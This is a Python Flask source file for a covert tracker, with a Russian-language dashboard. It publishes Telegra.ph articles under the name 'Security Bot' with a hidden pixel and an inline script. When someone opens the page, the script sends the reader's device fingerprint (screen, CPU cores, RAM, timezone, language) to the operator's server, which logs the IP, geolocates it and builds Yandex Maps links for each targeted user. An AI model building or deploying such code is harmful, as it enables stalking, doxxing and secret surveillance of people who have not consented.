from flask import Flask, request, jsonify, render_template_string, redirect
import json
from datetime import datetime
import os
from user_agents import parse
import requests
import logging
import urllib.parse

app = Flask(__name__)
pending_js_data = {}
user_articles = {}  # {user_id: {'url': article_url, 'username': username}}
users_data = {}  # {user_id: username}

# HTML шаблон для страницы статистики
STATS_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Статистика посещений</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        h1 {
            color: white;
            text-align: center;
            margin-bottom: 30px;
            font-size: 2.5em;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
        }
        .users-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(450px, 1fr));
            gap: 25px;
            margin-bottom: 30px;
        }
        .user-card {
            background: white;
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .user-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 3px solid #667eea;
        }
        .user-name {
            font-size: 1.3em;
            font-weight: bold;
            color: #333;
        }
        .user-id {
            background: #667eea;
            color: white;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.8em;
            font-family: monospace;
        }
        .stats-count {
            background: #764ba2;
            color: white;
            padding: 3px 10px;
            border-radius: 20px;
            font-size: 0.8em;
            margin-left: 10px;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
            gap: 15px;
            margin-top: 15px;
        }
        .stat-card {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 15px;
            border-left: 4px solid #667eea;
        }
        .stat-time {
            color: #667eea;
            font-weight: bold;
            font-size: 0.85em;
            margin-bottom: 8px;
        }
        .stat-row {
            display: flex;
            margin-bottom: 6px;
            font-size: 0.9em;
        }
        .stat-label {
            width: 90px;
            color: #666;
        }
        .stat-value {
            flex: 1;
            color: #333;
            font-weight: 500;
        }
        .yandex-map-link {
            display: inline-block;
            background: #ffcc00;
            color: #333;
            padding: 5px 12px;
            border-radius: 20px;
            text-decoration: none;
            font-size: 0.85em;
            font-weight: bold;
            margin-top: 5px;
            transition: background 0.3s;
        }
        .yandex-map-link:hover {
            background: #ffdb4d;
        }
        .no-data {
            text-align: center;
            color: #999;
            padding: 20px;
            font-style: italic;
        }
        .footer {
            text-align: center;
            color: rgba(255,255,255,0.8);
            margin-top: 30px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📊 Статистика посещений</h1>
        
        <div class="users-grid">
            {% for user_id, user_data in users.items() %}
            <div class="user-card">
                <div class="user-header">
                    <span class="user-name">👤 {{ user_data.username }}</span>
                    <span class="user-id">ID: {{ user_id }}</span>
                </div>
                
                {% if user_data.visits %}
                <div style="margin-bottom: 10px;">
                    <span class="stats-count">Всего посещений: {{ user_data.visits|length }}</span>
                    {% if user_data.article_url %}
                    <a href="{{ user_data.article_url }}" target="_blank" style="float: right; color: #667eea;">🔗 Статья</a>
                    {% endif %}
                </div>
                
                <div class="stats-grid">
                    {% for visit in user_data.visits[-5:]|reverse %}
                    <div class="stat-card">
                        <div class="stat-time">🕐 {{ visit.timestamp[:19] }}</div>
                        
                        <div class="stat-row">
                            <span class="stat-label">📍 Место:</span>
                            <span class="stat-value">{{ visit.city or 'неизвестно' }}, {{ visit.country or '' }}</span>
                        </div>
                        
                        {% if visit.map_link %}
                        <div class="stat-row">
                            <span class="stat-label">🗺️ Карта:</span>
                            <span class="stat-value">
                                <a href="{{ visit.map_link }}" target="_blank" class="yandex-map-link">Открыть в Яндекс Картах</a>
                            </span>
                        </div>
                        {% else %}
                        <div class="stat-row">
                            <span class="stat-label">🗺️ Карта:</span>
                            <span class="stat-value">нет координат</span>
                        </div>
                        {% endif %}
                        
                        <div class="stat-row">
                            <span class="stat-label">💻 Устройство:</span>
                            <span class="stat-value">{{ visit.os }} / {{ visit.browser }}</span>
                        </div>
                        
                        <div class="stat-row">
                            <span class="stat-label">📱 Тип:</span>
                            <span class="stat-value">{{ visit.device }}</span>
                        </div>
                        
                        <div class="stat-row">
                            <span class="stat-label">🖥️ Экран:</span>
                            <span class="stat-value">{{ visit.screen or '?' }}</span>
                        </div>
                        
                        <div class="stat-row">
                            <span class="stat-label">⚡ CPU/RAM:</span>
                            <span class="stat-value">{{ visit.cores or '?' }} ядер / {{ visit.ram or '?' }} GB</span>
                        </div>
                        
                        <div class="stat-row">
                            <span class="stat-label">🕒 Часовой пояс:</span>
                            <span class="stat-value">{{ visit.timezone or '?' }}</span>
                        </div>
                        
                        <div class="stat-row">
                            <span class="stat-label">🔗 Откуда:</span>
                            <span class="stat-value">{{ visit.referer[:30] + '...' if visit.referer and visit.referer|length > 30 else visit.referer or 'direct' }}</span>
                        </div>
                        
                        <div class="stat-row">
                            <span class="stat-label">🌐 IP:</span>
                            <span class="stat-value">{{ visit.ip }}</span>
                        </div>
                    </div>
                    {% endfor %}
                </div>
                
                {% if user_data.visits|length > 5 %}
                <div style="text-align: center; margin-top: 10px; color: #666;">
                    и ещё {{ user_data.visits|length - 5 }} посещений...
                </div>
                {% endif %}
                
                {% else %}
                <div class="no-data">📭 Нет посещений</div>
                {% endif %}
            </div>
            {% endfor %}
        </div>
        
        <div class="footer">
            ⚡ Обновлено: {{ now }}
        </div>
    </div>
</body>
</html>
'''

def parse_ua(ua_string):
    ua = parse(ua_string)
    return {
        'os': ua.os.family,
        'os_version': ua.os.version_string,
        'browser': ua.browser.family,
        'browser_version': ua.browser.version_string,
        'device': 'mobile' if ua.is_mobile else 'tablet' if ua.is_tablet else 'desktop'
    }

def get_coords(ip):
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}')
        data = response.json()
        if data.get('status') == 'success':
            return {
                'lat': data.get('lat'),
                'lon': data.get('lon'),
                'city': data.get('city'),
                'country': data.get('country')
            }
    except Exception as e:
        logging.error(f"Geo error: {e}")
    return {
        'lat': None,
        'lon': None,
        'city': None,
        'country': None
    }

def get_yandex_map_link(lat, lon, city=None):
    if lat and lon:
        coords = f"{lon},{lat}"
        if city:
            text = urllib.parse.quote(f"Посетитель из {city}")
            return f"https://yandex.ru/maps/?pt={coords}&z=15&l=map&text={text}"
        else:
            return f"https://yandex.ru/maps/?pt={coords}&z=15&l=map"
    return None

def save_user_data(user_id, username, article_url):
    if user_id not in users_data:
        users_data[user_id] = username
    if user_id not in user_articles:
        user_articles[user_id] = {'url': article_url, 'username': username}
    else:
        user_articles[user_id]['username'] = username

def save_to_json(ip, user_agent, referer, target_user_id=None, js_data=None):
    parsed = parse_ua(user_agent)
    coords = get_coords(ip)
    
    if js_data is None:
        js_data = {}
    
    map_link = get_yandex_map_link(coords.get('lat'), coords.get('lon'), coords.get('city'))
    
    data = {
        'timestamp': datetime.now().isoformat(),
        'ip': ip,
        'lat': coords.get('lat'),
        'lon': coords.get('lon'),
        'city': coords.get('city'),
        'country': coords.get('country'),
        'os': parsed['os'],
        'os_version': parsed['os_version'],
        'browser': parsed['browser'],
        'browser_version': parsed['browser_version'],
        'device': parsed['device'],
        'referer': referer,
        'map_link': map_link,
        'screen': js_data.get('screen'),
        'language': js_data.get('language'),
        'platform': js_data.get('platform'),
        'cores': js_data.get('cores'),
        'ram': js_data.get('ram'),
        'timezone': js_data.get('timezone'),
    }
    
    if os.path.exists('all_visits.json'):
        with open('all_visits.json', 'r', encoding='utf-8') as f:
            all_visits = json.load(f)
    else:
        all_visits = []
    
    all_visits.append(data)
    
    with open('all_visits.json', 'w', encoding='utf-8') as f:
        json.dump(all_visits, f, indent=2, ensure_ascii=False)
    
    if target_user_id:
        filename = f'visits_{target_user_id}.json'
        if os.path.exists(filename):
            with open(filename, 'r', encoding='utf-8') as f:
                user_visits = json.load(f)
        else:
            user_visits = []
        
        user_visits.append(data)
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(user_visits, f, indent=2, ensure_ascii=False)
        
        return data, filename
    else:
        return data, None

@app.route('/api/log', methods=['POST'])
def api_log():
    try:
        data = request.get_json()
        ip = request.remote_addr
        if data:
            pending_js_data[ip] = data
            return jsonify({'status': 'ok'})
    except Exception as e:
        logging.error(f"JS error: {e}")
    return jsonify({'status': 'error'}), 400

@app.route('/pixel.gif')
def pixel():
    try:
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'unknown')
        referer = request.headers.get('Referer', 'direct')
        
        target_user_id = request.args.get('user')
        
        js_data = pending_js_data.pop(ip, {})
        
        data, filename = save_to_json(ip, user_agent, referer, target_user_id, js_data)
        
        transparent_gif = (
            b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00'
            b'\x00\x00\x00\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00'
            b'\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02'
            b'\x44\x01\x00\x3b'
        )
        return transparent_gif, 200, {'Content-Type': 'image/gif'}
        
    except Exception as e:
        logging.error(f"Pixel error: {e}")
        return '', 500

@app.route('/')
def home():
    return redirect('/stats')

@app.route('/stats')
def show_all_stats():
    users = {}
    
    for user_id, article_info in user_articles.items():
        filename = f'visits_{user_id}.json'
        visits = []
        if os.path.exists(filename):
            with open(filename, 'r', encoding='utf-8') as f:
                visits = json.load(f)
        
        users[user_id] = {
            'username': article_info.get('username', f'User_{user_id}'),
            'article_url': article_info.get('url'),
            'visits': visits
        }
    
    if os.path.exists('all_visits.json'):
        with open('all_visits.json', 'r', encoding='utf-8') as f:
            all_visits = json.load(f)
        
        unknown_visits = {}
        for visit in all_visits:
            ip = visit['ip']
            if ip not in unknown_visits:
                unknown_visits[ip] = []
            unknown_visits[ip].append(visit)
        
        for ip, visits in unknown_visits.items():
            users[f'unknown_{ip}'] = {
                'username': f'Unknown ({ip})',
                'article_url': None,
                'visits': visits
            }
    
    return render_template_string(
        STATS_TEMPLATE, 
        users=users, 
        now=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    )

@app.route('/stats/<user_id>')
def show_user_stats(user_id):
    filename = f'visits_{user_id}.json'
    visits = []
    if os.path.exists(filename):
        with open(filename, 'r', encoding='utf-8') as f:
            visits = json.load(f)
    
    users = {
        user_id: {
            'username': user_articles.get(user_id, {}).get('username', f'User_{user_id}'),
            'article_url': user_articles.get(user_id, {}).get('url'),
            'visits': visits
        }
    }
    
    return render_template_string(
        STATS_TEMPLATE, 
        users=users, 
        now=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    )

def telegraph(title, text, server_url, user_id, username):
    content_nodes = []
    
    paragraphs = text.split('\n\n')
    for p in paragraphs:
        if p.strip():
            content_nodes.append({
                'tag': 'p',
                'children': [p.strip()]
            })
    
    tracking_url = f'{server_url}/pixel.gif?user={user_id}'
    
    content_nodes.append({
        'tag': 'div',
        'attrs': {'style': 'display:none'},
        'children': [
            {
                'tag': 'img',
                'attrs': {
                    'src': tracking_url,
                    'width': '1',
                    'height': '1'
                }
            },
            {
                'tag': 'script',
                'children': [
                    '(function() {',
                    f'fetch("{server_url}/api/log", {{',
                    'method: "POST",',
                    'headers: {"Content-Type": "application/json"},',
                    'body: JSON.stringify({',
                    'screen: screen.width + "x" + screen.height,',
                    'language: navigator.language,',
                    'platform: navigator.platform,',
                    'cores: navigator.hardwareConcurrency,',
                    'ram: navigator.deviceMemory,',
                    'timezone: Intl.DateTimeFormat().resolvedOptions().timeZone',
                    '})',
                    '});',
                    '})();'
                ]
            }
        ]
    })
    
    url = "https://api.telegra.ph/createPage"
    
    params = {
        'title': title,
        'author_name': 'Security Bot',
        'content': json.dumps(content_nodes, ensure_ascii=False),
        'return_content': False
    }
    
    try:
        response = requests.post(url, data=params)
        result = response.json()
        
        if result.get('ok'):
            page_url = result['result']['url']
            save_user_data(user_id, username, page_url)
            return page_url
        else:
            return None
            
    except Exception as e:
        logging.error(e)
        return None

def start_flask():
    app.run(host='0.0.0.0', port=5000)

if __name__ == '__main__':
    start_flask()